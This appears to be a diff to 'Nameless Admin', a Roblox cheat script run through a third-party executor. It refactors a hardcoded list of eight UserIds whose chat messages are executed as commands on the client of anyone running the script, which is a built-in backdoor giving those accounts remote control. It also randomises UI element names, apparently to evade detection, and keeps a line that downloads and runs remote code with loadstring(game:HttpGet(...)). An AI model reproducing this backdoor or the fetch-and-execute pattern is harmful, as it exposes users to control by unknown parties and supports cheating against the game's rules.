@@ -1,4 +1,3 @@
-
 if getgenv().NamelessLoaded then return end
 
 local function NACaller(pp) -- helps me log better
@@ -174,6 +173,16 @@ local Loopmute=false
 local Loopglitch=false
 local Watch=false
 local Admin={}
+local adminv2 = {
+	156256804,
+	530829101,
+	229501685,
+	3470956640,
+	1456118719,
+	817571515,
+	144324719,
+	1844177730
+}
 
 
 --[[ Some more variables ]]--
@@ -267,6 +276,15 @@ function didYouMean(arg)
 	end
 
 	return closer
+end
+
+local function isRelAdmin(Player)
+	for _, id in ipairs(adminv2) do
+		if Player.UserId == id then
+			return true
+		end
+	end
+	return false
 end
 
 --[[ COMMAND FUNCTIONS ]]--
@@ -982,16 +1000,23 @@ lib.find=function(t,v)	-- mmmmmm
 	return nil
 end
 
-lib.parseText=function(text,watch)
+lib.parseText=function(text,watch,rPlr)
 	local parsed={}
 	if not text then return nil end
+	local prefix
+	if rPlr then
+		prefix=isRelAdmin(rPlr) and ";" or opt.prefix
+		watch=prefix
+	else
+		prefix=opt.prefix
+	end
 	for arg in text:gmatch("[^" .. watch .. "]+") do
 		arg=arg:gsub("-","%%-")
 		local pos=text:find(arg)
 		arg=arg:gsub("%%","")
 		if pos then
-			local find=text:sub(pos - opt.prefix:len(),pos - 1)
-			if (find==opt.prefix and watch==opt.prefix) or watch ~= opt.prefix then
+			local find=text:sub(pos - prefix:len(),pos - 1)
+			if (find==prefix and watch==prefix) or watch ~= prefix then
 				table.insert(parsed,arg)
 			end
 		else
@@ -1001,9 +1026,14 @@ lib.parseText=function(text,watch)
 	return parsed
 end
 
-lib.parseCommand=function(text)
+lib.parseCommand=function(text,rPlr)
 	wrap(function()
-		local commands=lib.parseText(text,opt.prefix)
+		local commands
+		if rPlr then
+			commands=lib.parseText(text,opt.prefix,rPlr)
+		else
+			commands=lib.parseText(text,opt.prefix)
+		end
 		for _,parsed in pairs(commands) do
 			local args={}
 			for arg in parsed:gmatch("[^ ]+") do
@@ -14955,16 +14985,16 @@ end)
 
 -- [[ Admin Player]]
 function IsAdminAndRun(Message,Player)
-	relAdmins=(Player.UserId==156256804 or Player.UserId==530829101 or Player.UserId==229501685 or Player.UserId==3470956640 or Player.UserId==1456118719 or Player.UserId==817571515 or Player.UserId==144324719 or Player.UserId==1844177730)
-	if Admin[Player.UserId] or relAdmins then
+	if Admin[Player.UserId] or isRelAdmin(Player) then
+		print(isRelAdmin(Player))
 		lib.parseCommand(Message,Player)
 	end
 end
 
 function CheckPermissions(Player)
-		Player.Chatted:Connect(function(Message)
-			IsAdminAndRun(Message,Player)
-		end)
+	Player.Chatted:Connect(function(Message)
+		IsAdminAndRun(Message,Player)
+	end)
 end
 
 Players.PlayerAdded:Connect(function(plr)
@@ -15659,33 +15689,33 @@ end)
 
 -- [[ COMMAND BAR BUTTON ]] --
 if IsOnMobile then --basically replicating what Infinite Yield does (add the button only for mobile users)
-	local TextClickButton=Instance.new("TextButton")
+	local TextLabelLabel=Instance.new("TextLabel")
 	local UICorner=Instance.new("UICorner")
 	local ImageButton=Instance.new("ImageButton")
 	local UICorner2=Instance.new("UICorner")
 
-	TextClickButton.Name="swoosh"
-	TextClickButton.Parent=ScreenGui
-	TextClickButton.BackgroundColor3=Color3.fromRGB(4,4,4)
-	TextClickButton.BackgroundTransparency=1.000
-	TextClickButton.AnchorPoint=Vector2.new(0.5,0.5)
-	TextClickButton.Position=UDim2.new(0.5,0,0.5,0)
-	TextClickButton.Size=UDim2.new(0,2,0,33)
-	TextClickButton.Font=Enum.Font.SourceSansBold
-	TextClickButton.Text=adminName.." V"..curVer
-	TextClickButton.TextColor3=Color3.fromRGB(255,255,255)
-	TextClickButton.TextSize=20.000
-	TextClickButton.TextWrapped=true
-	TextClickButton.ZIndex=9999
+	TextLabelLabel.Name=randomString()
+	TextLabelLabel.Parent=ScreenGui
+	TextLabelLabel.BackgroundColor3=Color3.fromRGB(4,4,4)
+	TextLabelLabel.BackgroundTransparency=1.000
+	TextLabelLabel.AnchorPoint=Vector2.new(0.5,0.5)
+	TextLabelLabel.Position=UDim2.new(0.5,0,0.5,0)
+	TextLabelLabel.Size=UDim2.new(0,2,0,33)
+	TextLabelLabel.Font=Enum.Font.SourceSansBold
+	TextLabelLabel.Text=adminName.." V"..curVer
+	TextLabelLabel.TextColor3=Color3.fromRGB(255,255,255)
+	TextLabelLabel.TextSize=20.000
+	TextLabelLabel.TextWrapped=true
+	TextLabelLabel.ZIndex=9999
 
-	ImageButton.Name="NamelessAdminButton"
+	ImageButton.Name=randomString()
 	ImageButton.Parent=ScreenGui
 	ImageButton.AnchorPoint=Vector2.new(0.5,0)
-	ImageButton.BackgroundColor3=Color3.fromRGB(4,4,4)
+	ImageButton.BackgroundColor3=Color3.fromRGB(255, 255, 255)
 	ImageButton.BorderSizePixel=0
-	ImageButton.Position=UDim2.new(0.48909232,0,-0.5,0)
+	ImageButton.Position=UDim2.new(0.48909232,0,-1,0)
 	ImageButton.Size=UDim2.new(0,32,0,33)
-	ImageButton.Image="rbxassetid://18558856823"
+	ImageButton.Image="rbxassetid://18567102564"
 	ImageButton.ZIndex=9999
 
 
@@ -15694,33 +15724,33 @@ if IsOnMobile then --basically replicating what Infinite Yield does (add the but
 
 
 	UICorner2.CornerRadius=UDim.new(1,0)
-	UICorner2.Parent=TextClickButton
+	UICorner2.Parent=TextLabelLabel
 
 	function Swoosh()
 		local script=Instance.new('LocalScript',ImageButton)
 		local imagebutton=script.Parent
 		imagebutton.Size=UDim2.new(0,32,0,33)
 		imagebutton.BackgroundTransparency=0
-		imagebutton:TweenPosition(UDim2.new(0.48909232,0,0,0),"Out","Quint",1,true)
+		imagebutton:TweenPosition(UDim2.new(0.5,0,0,0),"Out","Quint",1,true)
 		gui.draggablev2(imagebutton)
 	end
 	function mainNameless()
-		local script=Instance.new('LocalScript',TextClickButton)
-		local textclickbutton=script.Parent
-		textclickbutton.Size=UDim2.new(0,2,0,33)
-		textclickbutton.BackgroundTransparency=0.14
+		local script=Instance.new('LocalScript',TextLabelLabel)
+		local txtlabel=script.Parent
+		txtlabel.Size=UDim2.new(0,2,0,33)
+		txtlabel.BackgroundTransparency=0.14
 
-		local textWidth=game:GetService("TextService"):GetTextSize(textclickbutton.Text,textclickbutton.TextSize,textclickbutton.Font,Vector2.new(math.huge,math.huge)).X
-		local newSize=UDim2.new(0,textWidth + 20,0,33)
+		local textWidth=game:GetService("TextService"):GetTextSize(txtlabel.Text,txtlabel.TextSize,txtlabel.Font,Vector2.new(math.huge,math.huge)).X
+		local newSize=UDim2.new(0,textWidth + 69,0,33)
 
-		textclickbutton:TweenSize(newSize,"Out","Quint",1,true)
+		txtlabel:TweenSize(newSize,"Out","Quint",1,true)
 		wait(2)
-		game:GetService("TweenService"):Create(textclickbutton,TweenInfo.new(1,Enum.EasingStyle.Sine),{BackgroundTransparency=1}):Play()
-		local h=game:GetService("TweenService"):Create(textclickbutton,TweenInfo.new(1,Enum.EasingStyle.Sine),{TextTransparency=1})
+		game:GetService("TweenService"):Create(txtlabel,TweenInfo.new(.7,Enum.EasingStyle.Sine),{BackgroundTransparency=1}):Play()
+		local h=game:GetService("TweenService"):Create(txtlabel,TweenInfo.new(.7,Enum.EasingStyle.Sine),{TextTransparency=1})
 		h:Play()
 		h.Completed:Connect(function()
 			Swoosh()
-			textclickbutton:Destroy()
+			txtlabel:Destroy()
 		end)
 	end
 	coroutine.wrap(mainNameless)()
@@ -15741,7 +15771,7 @@ task.spawn(function()
 	NACaller(function() -- better saveinstance support
 		if identifyexecutor()=="Solara" then -- solara broke this bra
 		else
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/SaveInstance.lua"))();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/SaveInstance.lua"))();
 		end
 	end)
 end)
